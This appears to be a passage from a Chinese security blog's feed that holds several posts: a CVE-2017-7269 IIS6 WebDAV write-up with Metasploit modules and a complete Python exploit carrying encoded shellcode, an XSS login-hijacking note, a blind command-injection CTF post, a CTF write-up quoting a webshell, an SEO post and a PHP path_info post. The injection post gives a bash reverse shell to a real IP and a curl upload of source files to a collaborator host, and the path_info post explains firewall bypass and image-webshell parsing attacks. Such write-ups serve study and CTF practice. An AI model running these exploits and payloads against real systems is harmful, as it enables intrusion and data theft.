EXP执行成功后&emsp;&emsp;当exp执行成功一段时间之后(大概十分钟到二十分钟左右，其间无论有无访问，被windbg挂起的时间不算)，再对这个站点执行exp永远不会成功，同时返回400。 &emsp;&emsp;遇到该问题的解决方案： 1.找旁站，因为每个池都是独立的w3wp进程，换一个可能在其他池的进行尝试 2.等待w3wp重启 Win03 x64&emsp;&emsp;Win03 x64并不多见，此类型的不能直接用网上的POC进行攻击。 总结 MSF-ExploitCVE-2017-7269&emsp;&emsp;该exploit是我们比赛时albertchang找到的一个可以成功利用的exploit（后面我会提及那个不能用的exploit）。 &emsp;&emsp;该exploit用法很简单，只需要填写域名和端口即可。 &emsp;&emsp;但是其对非默认端口或非默认路径的站点却束手无策。 &emsp;&emsp;看下此exploit的代码： 12345678910111213141516def exploit connect buf1 = "If: &lt;http://localhost/aaaaaaa" buf1 &lt;&lt; padding1 buf1 &lt;&lt; "&gt;" buf1 &lt;&lt; " (Not &lt;locktoken:write1&gt;) &lt;http://localhost/bbbbbbb" buf1 &lt;&lt; padding2 buf1 &lt;&lt; payload.encoded sock.put("PROPFIND / HTTP/1.1\r\nHost: localhost\r\nContent-Length: 0\r\n#&#123;buf1&#125;&gt;\r\n\r\n") handler disconnect end &emsp;&emsp;可以看出这个exploit只是对POC进行了修改，将POC中的shellcode替换成了MSF的shellcode，因此在非默认绑定或者非默认物理路径的情况下利用不成功。 iis_webdav_scstoragepathfromurl完善前&emsp;&emsp;iis_webdav_scstoragepathfromurl是由zcgonvh大佬编写且国外的大佬完善过的，而我们这一小节写的是未经过国外大佬完善的exploit,也就是zcgonvh大佬原版的EXP。 &emsp;&emsp;对于默认物理路径长度以及默认绑定情况： &emsp;&emsp;可以看到该exploit相比于第一个，增加了物理路径的长度和HttpHost两个字段，其中对exploit成功与否造成影响的是物理路径的长度(因为根据上面的测试，我们知道if中的域名只要与host的值一致即可)。 &emsp;&emsp;对于非默认物理路径长度以及非默认绑定情况也可以利用成功，只需要修改物理路径的长度和端口即可，如下图。 &emsp;&emsp;从代码看： 1234567891011121314151617181920def exploit connect http_host=datastore['HttpHost'] + ":" + datastore['RPORT'].to_s buf1 = "If: &lt;http://#&#123;http_host&#125;/" buf1 &lt;&lt; "a"*(114-datastore['PhysicalPathLength']) buf1 &lt;&lt; padding1 buf1 &lt;&lt; "&gt;" buf1 &lt;&lt; " (Not &lt;locktoken:write1&gt;) &lt;http://#&#123;http_host&#125;/" buf1 &lt;&lt; "b"*(114-datastore['PhysicalPathLength']) buf1 &lt;&lt; padding2 buf1 &lt;&lt; payload.encoded sock.put("PROPFIND / HTTP/1.1\r\nHost: #&#123;http_host&#125;\r\nContent-Length: 0\r\n#&#123;buf1&#125;&gt;\r\n\r\n") handler disconnect end &emsp;&emsp;可以看出来zcgonvh大佬在编写Exploit的时候，把关于绑定和物理路径长度的问题都解决了，唯一不智能的一点就是需要自己输入物理路径的长度。 iis_webdav_scstoragepathfromurl&emsp;&emsp;这个exploit是MSF自带的一个EXP，该EXP由zcgonvh大佬编写且国外的大佬完善过的，但是在比赛中以及这次写文章复现过程中都没有成功过一次。翻看了一下代码： 123456789http_host = "#&#123;server_scheme&#125;://#&#123;server_name&#125;:#&#123;server_port&#125;" vprint_status("Using http_host #&#123;http_host&#125;") min_path_len.upto(max_path_len) do |path_len| vprint_status("Trying path length of #&#123;path_len&#125;...") begin buf1 = "&lt;#&#123;http_host&#125;/" buf1 &lt;&lt; rand_text_alpha(114 - path_len) &emsp;&emsp;该exploit相对于zcgonvh编写的Exploit来说，添加了自动爆破物理路径长度的功能，其爆破开始的最小值和最大值是可以设置的。 总结 物理路径长度爆破工具12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#coding:utf-8#-----------# 物理路径长度大于19位的POC#-----------import socket#-------------## 自定义区 ##-------------#host = '192.168.27.136' # 域名port = 81 # 端口#-------------## 自定义区结束##-------------#def exploit(host,port,pathLen): sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.connect((host,port)) host = "localhost123" pay='PROPFIND / HTTP/1.1\r\nHost: &#123;&#125;\r\nContent-Length: 0\r\n'.format(host) padding = 'a'*(114-pathLen) domain = "http://"+host+":"+str(port)+"/" pay+='If: &lt;' pay+=domain pay+=padding pay+='\xe6\xa9\xb7\xe4\x85\x84\xe3\x8c\xb4\xe6\x91\xb6\xe4\xb5\x86\xe5\x99\x94\xe4\x9d\xac\xe6\x95\x83\xe7\x98\xb2\xe7\x89\xb8\xe5\x9d\xa9\xe4\x8c\xb8\xe6\x89\xb2\xe5\xa8\xb0\xe5\xa4\xb8\xe5\x91\x88\xc8\x82\xc8\x82\xe1\x8b\x80\xe6\xa0\x83\xe6\xb1\x84\xe5\x89\x96\xe4\xac\xb7\xe6\xb1\xad\xe4\xbd\x98\xe5\xa1\x9a\xe7\xa5\x90\xe4\xa5\xaa\xe5\xa1\x8f\xe4\xa9\x92\xe4\x85\x90\xe6\x99\x8d\xe1\x8f\x80\xe6\xa0\x83\xe4\xa0\xb4\xe6\x94\xb1\xe6\xbd\x83\xe6\xb9\xa6\xe7\x91\x81\xe4\x8d\xac\xe1\x8f\x80\xe6\xa0\x83\xe5\x8d\x83\xe6\xa9\x81\xe7\x81\x92\xe3\x8c\xb0\xe5\xa1\xa6\xe4\x89\x8c\xe7\x81\x8b\xe6\x8d\x86\xe5\x85\xb3\xe7\xa5\x81\xe7\xa9\x90\xe4\xa9\xac' pay+='&gt;' pay+=' (Not &lt;locktoken:write1&gt;) &lt;' pay+=domain pay+=padding pay+='\xe5\xa9\x96\xe6\x89\x81\xe6\xb9\xb2\xe6\x98\xb1\xe5\xa5\x99\xe5\x90\xb3\xe3\x85\x82\xe5\xa1\xa5\xe5\xa5\x81\xe7\x85\x90\xe3\x80\xb6\xe5\x9d\xb7\xe4\x91\x97\xe5\x8d\xa1\xe1\x8f\x80\xe6\xa0\x83\xe6\xb9\x8f\xe6\xa0\x80\xe6\xb9\x8f\xe6\xa0\x80\xe4\x89\x87\xe7\x99\xaa\xe1\x8f\x80\xe6\xa0\x83\xe4\x89\x97\xe4\xbd\xb4\xe5\xa5\x87\xe5\x88\xb4\xe4\xad\xa6\xe4\xad\x82\xe7\x91\xa4\xe7\xa1\xaf\xe6\x82\x82\xe6\xa0\x81\xe5\x84\xb5\xe7\x89\xba\xe7\x91\xba\xe4\xb5\x87\xe4\x91\x99\xe5\x9d\x97\xeb\x84\x93\xe6\xa0\x80\xe3\x85\xb6\xe6\xb9\xaf\xe2\x93\xa3\xe6\xa0\x81\xe1\x91\xa0\xe6\xa0\x83\xcc\x80\xe7\xbf\xbe\xef\xbf\xbf\xef\xbf\xbf\xe1\x8f\x80\xe6\xa0\x83\xd1\xae\xe6\xa0\x83\xe7\x85\xae\xe7\x91\xb0\xe1\x90\xb4\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81\xe9\x8e\x91\xe6\xa0\x80\xe3\xa4\xb1\xe6\x99\xae\xe4\xa5\x95\xe3\x81\x92\xe5\x91\xab\xe7\x99\xab\xe7\x89\x8a\xe7\xa5\xa1\xe1\x90\x9c\xe6\xa0\x83\xe6\xb8\x85\xe6\xa0\x80\xe7\x9c\xb2\xe7\xa5\xa8\xe4\xb5\xa9\xe3\x99\xac\xe4\x91\xa8\xe4\xb5\xb0\xe8\x89\x86\xe6\xa0\x80\xe4\xa1\xb7\xe3\x89\x93\xe1\xb6\xaa\xe6\xa0\x82\xe6\xbd\xaa\xe4\x8c\xb5\xe1\x8f\xb8\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81' shellcode='VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJIOPKSKPKPTKLITKKQDKU0G0KPKPM00QQXI8KPM0M0K8KPKPKPM0QNTKKNU397O00WRJKPSSI7KQR72JPXKOXPP3GP0PPP36VXLKM1VZM0LCKNSOKON2KPOSRORN3D35RND4NMPTD9RP2ENZMPT4352XCDNOS8BTBMBLLMKZOSROBN441URNT4NMPL2ERNS7SDBHOJMPNQ03LMLJPXNM1J13OWNMOS2H352CBKOJO0PCQFOUNMOB00NQNWNMP7OBP6OILMKZLMKZ130V15NMP2P0NQP7NMNWOBNV09KPM0A' pay+=shellcode pay+='&gt;\r\n\r\n' #print pay sock.send(pay) data = sock.recv(80960) #print data return data sock.closedef main(): for i in range(3,115): #print(i) data = exploit(host,port,i) #print data if "CVE-2017-7269" in data: print("[+]Length is "+ str(i)) breakmain()#exploit(host,port,pathLen) 批量检测工具 爆破物理路径长度并检测漏洞 指定物理路径长度检测漏洞 &emsp;&emsp;下载地址：IIS6_WebDAV_Scanner 参考CVE-2017-7269的几个技巧及BUG修正 CVE-2017-7269回显POC CVE-2017-7269 IIS6.0远程代码执行漏洞分析及Exploit CVE-2017-7269 IIS6.0远程代码执行漏洞分析及Exploit]]></content>
      <categories>
        <category>比赛</category>
        <category>巅峰极客</category>
      </categories>
      <tags>
        <tag>巅峰极客</tag>
        <tag>IIS6</tag>
        <tag>远程代码执行</tag>
        <tag>CVE-2017-7269</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java System Solutions SSO plugin for BMC MyIT 跨站脚本漏洞]]></title>
    <url>%2FJava-System-Solutions-SSO-plugin-for-BMC-MyIT-%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%BC%8F%E6%B4%9E.html</url>
    <content type="text"><![CDATA[&emsp;&emsp;今天看到这个漏洞，找了一个国外的站复现了一下，并且想出了一个新的思路，分享一下。 漏洞复现过程&emsp;&emsp;漏洞描述是这样说的。 &emsp;&emsp;其给出的payload是：/ux/jss-sso/arslogin?javascript:alert(123)。其原理是改变form表单的action属性为javascript:alert(123)，如果用户点击登录按钮则会触发XSS。 新思路-登录劫持&emsp;&emsp;那么问题来了，这是一个登录界面的XSS，而XSS导致的结果是泄露用户Cookie，用户还没登陆怎么能拿到用户登录后的Cookie呢？ 方法1：用JS记录键盘 方法2：Burp的Collaborator client插件获取用户登录信息 &emsp;&emsp;将Burp的Collaborator client插件生成的地址复制一下。 &emsp;&emsp;使用payload：/ux/jss-sso/arslogin?http://DNS隧道地址 &emsp;&emsp;点击登录以后，在Burp的Collaborator client插件中查看请求信息 &emsp;&emsp;使用Burp的Collaborator client插件要比直接利用XSS更加方便直接。]]></content>
      <categories>
        <category>渗透测试</category>
        <category>登录劫持</category>
      </categories>
      <tags>
        <tag>CVE-2018-15528</tag>
        <tag>漏洞复现</tag>
        <tag>XSS</tag>
        <tag>登录劫持</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[无回显代码执行利用方法]]></title>
    <url>%2F%E6%97%A0%E5%9B%9E%E6%98%BE%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95.html</url>
    <content type="text"><![CDATA[&emsp;&emsp;在Root-Me上有一道代码执行的题目，其链接为题目链接 执行多条语句&emsp;&emsp;打开题目以后，在输入框中提示127.0.0.1 &emsp;&emsp;输入127.0.0.1 &amp;&amp; whoami进行测试： &emsp;&emsp;提示Syntax Error，通过测试，发现127.0.0.1%0d%0awhoami可以执行成功。 尝试DNSLOG获取回显&emsp;&emsp;使用反引号执行代码，并用curl将执行结果返回给DNSLOG 1ip=127.0.0.1%0d%0acurl `whoami`.t00ls.3e426ecf5c48221e002db4ae061cc4bc.tu4.org &emsp;&emsp;代码正常执行，查看DNSLOG收到的回显。 &emsp;&emsp;发现whoami没有被执行，而是原样返回。 尝试反弹shell&emsp;&emsp;既然不能直接执行，就想着用nc返回一个交互式的shell来读取flag。 12345678# 服务器端执行nc -vv -lp 8888# 命令执行处执行bash -i &gt;&amp; /dev/tcp/47.95.206.199/8888 0&gt;&amp;1# payloadip=127.0.0.1%0d%0abash+-i+&gt;%26+/dev/tcp/47.95.206.199/8888+0&gt;%261 &emsp;&emsp;显示执行成功，但是服务器端并没有受到反弹的shell。 curl上传文件&emsp;&emsp;这个方法是公司的大佬想出来的，并不是本人创作，这里只是记录。 &emsp;&emsp;curl可以正常执行，那么使用curl -F将flag文件上传到Burp的Collaborator Client（Collaborator Client 类似DNSLOG，其功能要比DNSLOG强大，主要体现在可以查看POST请求包以及打Cookies）。 &emsp;&emsp;获取Collaborator Client分配给BURP的链接。 123打开Burp主界面 --&gt;菜单（Burp）--&gt;Burp Collaboraor Client -- &gt; 点击 Copy to Clipboard粘贴出来大概这样：XXXXXXXXXXXXXXXXXXXXXX.burpcollaborator.net &emsp;&emsp;拼接Payload，并提交。 12# payloadip=127.0.0.1%0d%0acurl -X POST -F xx=@index.php http://8clb1g723ior2vyd7sbyvcx6vx1ppe.burpcollaborator.net &emsp;&emsp;查看Collaborator Client收到的数据。 &emsp;&emsp;可以看到成功读取到了源码。]]></content>
      <categories>
        <category>渗透测试</category>
        <category>代码执行</category>
        <category>无回显代码执行</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>代码执行</tag>
        <tag>无回显代码执行</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网鼎杯第三场部分WriteUp]]></title>
    <url>%2F%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%B8%89%E5%9C%BA%E9%83%A8%E5%88%86WriteUp.html</url>
    <content type="text"><![CDATA[dewas &emsp;&emsp;下载附件，打开以后看到，附件中只有字母asdw和e，又提示是fps，所以，wsad应该对应的是上下左右，e表示结束。 1ddssdssdssdssdssdssdswdwwdwwdwwdwwddssdssdssdssdswdwwdwwdwwdwwdwwdwwdedsssssssssssssedwdwwdwwdwwdwwdwwdwwddssdssdssdsaaaaaaaaddddddddsdssdssdsdedwwwedsddsdddsddddwdddwddwwawaaawaaawaaawaaawadwdwwdddwdddsdddsddsedddddwwwessssssssssssssddddwdddwddwddwddwdwwdwawwaawaawaawaaawaaaaeddddddddddddddddddesssssssssssssseddddddewwwwwwwwwwwwwwdssdssdssdssdssdssdssdwwwwwwwwwwwwwweddddddddddddddssssssewwawwawawaaasasassasssassdsssdsddsddddwdwwdwwwaaaeddddddssssssewdwdwdwdwdwdwdawawawawawawaweddddddddddeddddddddaaaaaaaasssssssddddddaaaaaassssssseddddddddddddwwwwwwwwwwwwwwessssssssssdssdsddsdddwddwdwwdwwwwwwwwwwedddddssssssssssssssewwwwwwwwwwwwwwdssdssdssdssdssdssdssdwwwwwwwwwwwwwwedddddesssssssssesssess &emsp;&emsp;猜测，移动的轨迹就是flag，使用python编写代码，生成轨迹。 &emsp;&emsp;可以看出，轨迹形成的字母为WASDING&gt;FUN，加上flag{} 就是flag了。 1234567891011121314151617181920212223242526272829#coding: utf-8# Author: AdminTonyimport matplotlib.pyplot as pltwith open("1.txt","r+") as file: content = file.read()contentListX = []contentListY = []x = 0y = 0for c in content: if c=="a": x = x-1 elif c=="d": x = x+1 elif c=="w": y = y+1 elif c=="s": y = y-1 else: continue contentListX.append(x) contentListY.append(y)#print(contentListX)#print(contentListY)plt.plot(contentListX,contentListY)plt.show() comein &emsp;&emsp;在页面的源代码中，看到了该页面的逻辑代码。 123456789101112ini_set("display_errors",0);$uri = $_SERVER['REQUEST_URI']; // 请求的uriif(stripos($uri,"."))&#123; // uri中要么不出现“.” 要么以“.”开头 die("Unkonw URI.");&#125;if(!parse_url($uri,PHP_URL_HOST))&#123; //尝试解析uri $uri = "http://".$_SERVER['REMOTE_ADDR'].$_SERVER['REQUEST_URI'];&#125;$host = parse_url($uri,PHP_URL_HOST); //再次解析uriif($host === "c7f.zhuque.com")&#123; setcookie("AuthFlag","flag&#123;*******");&#125; &emsp;&emsp;简单的说：在最后解析$uri的HOST必须是c7f.zhuque.com，其中包含了”.”，因此uri要以”.”开头。uri以”.”开头，则第一次parse_url会为false，然后将uri拼接成http://ip{uri}。 &emsp;&emsp;百度了一下parse_url函数，看到： &emsp;&emsp;从而想到，uri可以构造为``.@c7f.zhuque.com/..//index.php shell.pcap&emsp;&emsp;根据名称，猜测应该是webshell的数据包，直接搜索http协议 &emsp;&emsp;shell的代码为: 12345678910&lt;?php$k = $_POST['k'];$c = $_POST['c'];$o = '';if (md5($k) == '6d697064ad1b78f7e124df9807284f69') &#123; exec($c, $o); $o = $o[0]; echo base64_encode(gzcompress($o, 6));&#125;?&gt; &emsp;&emsp;因此查询到的数据需要用以下代码来进行解密。 12345&lt;?php $st = "内容"; $st = gzuncompress(base64_decode($st)); echo $st;?&gt; &emsp;&emsp;继续查看数据包 &emsp;&emsp;查看flag.txt的内容，因此下面的数据包应该有加密后的flag。 &emsp;&emsp;拿去解密，并获取flag]]></content>
      <categories>
        <category>比赛</category>
        <category>CTF</category>
        <category>网鼎杯</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>比赛</tag>
        <tag>网鼎杯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo做SEO优化遇到的坑]]></title>
    <url>%2FHexo%E5%81%9ASEO%E4%BC%98%E5%8C%96%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91.html</url>
    <content type="text"><![CDATA[&emsp;&emsp;最近想对博客做一下SEO优化，但是里面还是遇到了一些坑的，写来记录一下。 Hexo做SEO优化&emsp;&emsp;对Hexo做SEO优化主要做了以下几个部分： 首页title优化&emsp;&emsp;更改index.swig文件(your-hexo-site\themes\next\layout\index.swig),将 1&#123;% block title %&#125; &#123;&#123; config.title &#125;&#125; &#123;% endblock %&#125; &emsp;&emsp;改为 1&#123;% block title %&#125; &#123;&#123; config.title &#125;&#125; - &#123;&#123; theme.description &#125;&#125; &#123;% endblock %&#125; &emsp;&emsp;这样更符合网站名称 - 网站描述这种格式。 生成sitemap并提交百度 1.安装sitemap自动生成插件 12npm install hexo-generator-sitemap --savenpm install hexo-generator-baidu-sitemap --save 2.在主题配置文件中添加配置 1234sitemap: path: sitemap.xmlbaidusitemap: path: baidusitemap.xml 3.在站点配置文件中修改URL 1url: http://www.admintony.com 添加nofollow标签&emsp;&emsp;nofollow标签是由谷歌领头创新的一个“反垃圾链接”的标签，并被百度、yahoo等各大搜索引擎广泛支持，引用nofollow标签的目的是：用于指示搜索引擎不要追踪（即抓取）网页上的带有nofollow属性的任何出站链接，以减少垃圾链接的分散网站权重。 &emsp;&emsp;以hexo的NexT主题为例，需要修改两处: 1.找到footer.swig，路径在your-hexo-site\themes\next\layout\_partials &emsp;&emsp;将下面代码 1&#123;&#123; __('footer.powered', '&lt;a class="theme-link" href="http://hexo.io"&gt;Hexo&lt;/a&gt;') &#125;&#125; &emsp;&emsp;改成 1&#123;&#123; __('footer.powered', '&lt;a class="theme-link" href="http://hexo.io" rel="external nofollow"&gt;Hexo&lt;/a&gt;') &#125;&#125; &emsp;&emsp;将下面代码 1&lt;a class="theme-link" href="https://github.com/iissnan/hexo-theme-next"&gt; &emsp;&emsp;改成 1&lt;a class="theme-link" href="https://github.com/iissnan/hexo-theme-next" rel="external nofollow"&gt; 2.修改sidebar.swig文件，路径在your-hexo-site\themes\next\layout_macro &emsp;&emsp;将下面代码 1&lt;a href="&#123;&#123; link &#125;&#125;" target="_blank"&gt;&#123;&#123; name &#125;&#125;&lt;/a&gt; &emsp;&emsp;改成 1&lt;a href="&#123;&#123; link &#125;&#125;" target="_blank" rel="external nofollow"&gt;&#123;&#123; name &#125;&#125;&lt;/a&gt; &emsp;&emsp;将下面代码 1&lt;a href="http://creativecommons.org/licenses/&#123;&#123; theme.creative_commons &#125;&#125;/4.0" class="cc-opacity" target="_blank"&gt; &emsp;&emsp;改成 1&lt;a href="http://creativecommons.org/licenses/&#123;&#123; theme.creative_commons &#125;&#125;/4.0" class="cc-opacity" target="_blank" rel="external nofollow"&gt; &emsp;&emsp;可以使用chinaz站长工具进行各项检测。 添加robots.txt 1.添加蜘蛛协议（放在blog\source目录下） 1234567891011121314# hexo robots.txtUser-agent: *Allow: /Allow: /archives/Disallow: /vendors/Disallow: /js/Disallow: /css/Disallow: /fonts/Disallow: /vendors/Disallow: /fancybox/Sitemap: http://www.admintony.com/sitemap.xmlSitemap: http://www.admintony.com/baidusitemap.xml 2.在百度站长平台监测并更新Robots 修改文章链接&emsp;&emsp;HEXO默认的文章链接形式为domain/year/month/day/postname，默认就是一个四级url，并且可能造成url过长，对搜索引擎是十分不友好的，我们可以改成 domain/postname的形式。编辑站点_config.yml文件，修改其中的permalink字段改为permalink: :title.html即可。 keywords和description&emsp;&emsp;在\scaffolds\post.md中添加如下代码，用于生成的文章中添加关键字和描述。 12keywords: description: &emsp;&emsp;在\themes\next\layout\_partials\head.swig有如下代码，用于生成文章的keywords。 1234567&#123;% if page.keywords %&#125; &lt;meta name="keywords" content="&#123;&#123; page.keywords &#125;&#125;" /&gt;&#123;% elif page.tags and page.tags.length %&#125; &lt;meta name="keywords" content="&#123;% for tag in page.tags %&#125;&#123;&#123; tag.name &#125;&#125;,&#123;% endfor %&#125;" /&gt;&#123;% elif theme.keywords %&#125; &lt;meta name="keywords" content="&#123;&#123; theme.keywords &#125;&#125;" /&gt;&#123;% endif %&#125; &emsp;&emsp;文章的摘要会变为description。 主动推送插件 1.安装hexo-baidu-url-submit插件 1npm install hexo-baidu-url-submit --save 2.配置站点的_config.yml文件 12345baidu_url_submit: count: 3 ## 比如3，代表提交最新的三个链接 host: www.admintony.com ## 在百度站长平台中注册的域名 token: your_token ## 请注意这是您的秘钥， 请不要发布在公众仓库里! path: baidu_urls.txt ## 文本文档的地址， 新链接会保存在此文本文档里 3.加入新的deployer(站点的_config.yml文件) 12345deploy:- type: git repo: coding: https://用户名:密码@git.coding.net/TinyJay/blog.git,master- type: baidu_url_submitter # 新加入的 从github迁至coding&emsp;&emsp;github是禁止百度蜘蛛爬行的，所以无法收录，因此将博客从Github迁移到了coding上，coding没有屏蔽百度蜘蛛，很方便被收录。 遇到的问题&emsp;&emsp;主要遇到了以下几点问题： 1.admintony.com和wwww.admintony.com收录情况不同 &emsp;&emsp;不加www的属于顶级域名；加www的属于顶级域名的子域名，对搜索引擎来说这两种域名是不同的站点。从而自然收录也会不一样。查收录时加www查到的数据是带www的这个制定网址网站的收录量；不加www的则还包括所有的二级域名网页收录在内。所以一般情况下，不加www比加www的收录量要大。 2.URL规则已经改成http://域名/文章名.html，但收录URL却是http://域名/年份/月份/天/文章名/ &emsp;&emsp;咨询了李春以后，得知，百度先将url对应的内容爬取到百度的数据库，然后再从数据库中去看内容是否符合百度的展示要求，因此爬去URL的内容和收录是有时间间隔的，所以我更换了URL规则，却收录的还是旧的URL规则。并且李春提示我要在百度进行网站改版。 网站改版规则改版 新旧链接301&emsp;&emsp;要在旧链接中添加301跳转到新链接，301状态码表示永久性的迁移到新链接，用html实现代码如下： 1&lt;META HTTP-EQUIV=REFRESH CONTENT="5;URL=http://www.admintony.com/SVN源代码泄露利用工具.html"&gt; &emsp;&emsp;也就意味着，把17个链接都做一下301则需要在source目录下，创建年份/月份/日期/标题/index.html，且index.html中的跳转链接必须是新的链接，一个一个写的话会累死，所以写了一个代码实现，代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788# coding = utf-8""" 用户输入数据：/2018/03/05/腾讯云COS图床智能上传工具编写/ 然后在当前目录下创建：依次创建这2018、03、05、腾讯云COS图床智能上传工具编写 这几个目录，并且在目录下创建一个index.html 其内容如下，其中&#123;&#125; 表示根据用户输入来更变的 &lt;html&gt; &lt;head&gt; &lt;META HTTP-EQUIV=REFRESH CONTENT="5;URL=http://www.admintony.com/&#123;&#125;.html"&gt; &lt;/head&gt; &lt;body&gt; 很抱歉给您带来不便，由于站点URL规则更变，您可访问&lt;a href="http://www.admintony.com/&#123;&#125;.html"&gt;&#123;&#125;&lt;/a&gt;来进行文章阅读，也可以等待5秒后自动跳转到该页面。 &lt;br&gt; &lt;span&gt;感谢您对AdminTony的关注与支持&lt;/span&gt; &lt;/body&gt; &lt;/html&gt;"""import os,re,sysdef makeDir(str): re_ = re.compile(r'/(\d+)/(\d+)/(\d+)/(.+)/') list = re_.findall(str) year = list[0][0] mouth = list[0][1] day = list[0][2] title = list[0][3] # 创建年份目录 if not os.path.exists(year): os.mkdir(year) # 创建月份目录 if not os.path.exists(year+"/"+mouth): os.mkdir(year+"/"+mouth) # 创建日期目录 if not os.path.exists(year+"/"+mouth+"/"+day): os.mkdir(year+"/"+mouth+"/"+day) # 创建名称目录 if not os.path.exists(year+"/"+mouth+"/"+day+"/"+title): os.mkdir(year+"/"+mouth+"/"+day+"/"+title) # 在日期目录下创建index.html with open(year+"/"+mouth+"/"+day+"/"+title+"/"+"index.html","wb+") as file: content = """&lt;html&gt;&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8"&gt;&lt;META HTTP-EQUIV=REFRESH CONTENT="5;URL=http://admintony.com/&#123;&#125;.html"&gt;&lt;/head&gt;&lt;body&gt;很抱歉给您带来不便，由于站点URL规则更变，您可访问&lt;a href="http://www.admintony.com/&#123;&#125;.html"&gt;&#123;&#125;&lt;/a&gt;来进行文章阅读，也可以等待5秒后自动跳转到该页面。&lt;br&gt;&lt;span&gt;感谢您对AdminTony的关注与支持&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span align="right"&gt;AdminTony 致上&lt;/span&gt;&lt;/body&gt;&lt;/html&gt; """.format(title,title,title) #print(content) file.write(content.encode("utf-8")) print("[+] 已创建完成") #print(list[0][1])def main(): if len(sys.argv)==1: while True: path = input("[+] Please Enter URL:") if "exit" in path: print("[+] Bye ~ ") break makeDir(path) elif len(sys.argv)==2: with open(sys.argv[1],"r+",encoding='UTF-8') as f: line = f.readlines() i = 0 for l in line: i = i+1 makeDir(l) print("[+] 共创建记录&#123;&#125;条".format(i))if __name__ == '__main__': main() 补充&emsp;&emsp;昨天把规则提交以后出现了一些状况，如下： 1.跳转关系与规则不符 &emsp;&emsp;对于这个错误我想了想具体是哪里出错了，后来想到在做301跳转的时候，把admintony.com的url都跳转到了www.admintony.com，而规则是填写的是admintony.com/${4}.html，所以出现这个错误。 &emsp;&emsp;解决方案：将301跳转到www.admintony.com改为跳转到admintony.com即可。 2.改版前旧链接抓取失败 &emsp;&emsp;做301跳转的时候，我只把百度收录的页面做了，而那些已经提交到百度数据库的页面，我并没有做301跳转，因此出现此错误。 &emsp;&emsp;博客一共写了49篇文章了，需要对49篇文章的旧链接都做一个301跳转，主要难题在于收集旧链接，站点已经更换了新链接，因此执笔写下工具来进行收集旧链接。 &emsp;&emsp;工具原理：正则匹配站点中的文章名称和发布时间，然后构造http://admintony.com/年份/月份/日期/文章名/并保存在url.txt。(工具在最下方) &emsp;&emsp;在blog/source目录下用新旧链接301中的工具生成301跳转页面。 &emsp;&emsp;重新发布页面后，重新向百度申请网站规则改版即可。 123456789101112131415161718192021222324252627282930# coding = utf-8import reimport requestsdef getUrl(domain): re_title = re.compile(r'&lt;link itemprop="mainEntityOfPage" href="(?:.+)/(.+).html"&gt;') re_date = re.compile(r'datetime="(\d+)-(\d+)-(\d+)T(?:.+)"&gt;') res = requests.get(domain) title = re_title.findall(res.text) date = re_date.findall(res.text) with open("url.txt","ab") as f: for i,j in zip(date,title): data = "http://admintony.com/&#123;&#125;/&#123;&#125;/&#123;&#125;/&#123;&#125;/\n".format(i[0],i[1],i[2],j) f.write(data.encode("utf-8"))def main(): domain = input('请输入网址：') page_max = input('请输入一共有多少分页：') page_max = int(page_max)+1 for i in range(1,page_max): if i == 1: getUrl(domain) else: getUrl(domain+"/page/&#123;&#125;/".format(i)) print("[+] 正在爬取第&#123;&#125;页".format(i)) print("[+] 爬取完毕，URL保存在url.txt中")if __name__ == '__main__': main()]]></content>
      <categories>
        <category>运维</category>
        <category>SEO优化</category>
      </categories>
      <tags>
        <tag>Hexo,SEO优化,网站改版</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP的path_info问题]]></title>
    <url>%2FPHP%E7%9A%84path-info%E9%97%AE%E9%A2%98.html</url>
    <content type="text"><![CDATA[&emsp;&emsp;本文主要讲述和记录PHP中path_info及其产生的安全性问题。 Path_info是什么？&emsp;&emsp;Path_info是PHP的一种路由模式，需要PHP.ini中设置cgi.fix_pathinfo=1才能开启该路由模式。该路由模式的URL格式为http://www.admintony.com/index.php/模块/方法。 Path_info的运行机制Apache容器下 &emsp;&emsp;那在Apahce容器下，Path_info有什么用呢？ &emsp;&emsp;很多防火墙为了提高效率，遇到js,png,jpg等格式的后缀时，则不检测后面参数中是否有非法数据，因此我们可以构造http://www.admintony.com/index.php/aaa.js?id=union select 1,2,3,4来绕过防火墙进行注入，当然也可以绕过防火墙进行代码执行、命令执行等操作，其他的还需要由你自己来开发。 IIS和Nginx容器下 &emsp;&emsp;在IIS和Nginx容器下，相比Apache少了一步对文件后缀的检测，因此产生了著名的安全问题CGI解析漏洞(也有称Nginx解析漏洞)。 &emsp;&emsp;其漏洞的利用方式就是上传一个含Webshell的图片，然后在图片地址后面加上/a.php使图片当作PHP解析。 &emsp;&emsp;当然，aa.php/aa.js也会把aa.php作为脚本，aa.js作为模块来解析执行的。 &emsp;&emsp;也可以构造aaa.jpg/aa.php/aa.js来用aa.js作为方法,aa.php不存在，因此aa.php作为模块，aaa.jpg被当作脚本来进行解析执行。 说明&emsp;&emsp;对于Path_info的工作机制的探讨，全部来自黑盒测试，可能与源码实现流程图有出入，但大体原理如此，也有些不能解释的问题，比如：都把Path_info路由模式交给PHP来处理的话，为什么在Apache容器下和在Nginx容器下处理结果会不同呢？(PS:Apache容器下是使用SAPI进行解析PHP的，而Nginx下是CGI模式解析PHP的)]]></content>
      <categories>
